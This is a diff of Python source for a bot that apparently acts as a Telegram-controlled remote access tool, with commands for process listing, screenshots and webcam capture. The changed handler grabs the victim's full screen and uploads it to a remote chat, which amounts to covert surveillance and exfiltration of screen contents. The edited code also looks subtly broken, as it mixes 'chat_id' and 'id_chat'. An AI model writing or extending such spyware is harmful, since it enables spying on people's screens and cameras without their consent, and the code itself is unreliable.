@@ -72,13 +72,13 @@ def tasklist(command):
 @bot.message_handler(commands=['screen'])
 def send_screen(command):
 	try:
-		screen = ImageGrab.grab()
-		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
-		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
-		files = {'photo': screen}
-		bot.send_photo(id_chat, screen)
+		screenshot = ImageGrab.grab()
+		screenshot.save('screenshot.jpg')
+		bot.sendChatAction(chat_id, 'upload_photo')
+		bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
+		os.remove('screenshot.jpg')
 	except:
-		bot.send_photo(id_chat, 'Error')
+		bot.send_message(id_chat, 'Error')
 
 @bot.message_handler(commands=['cam'])
 def cam(command):
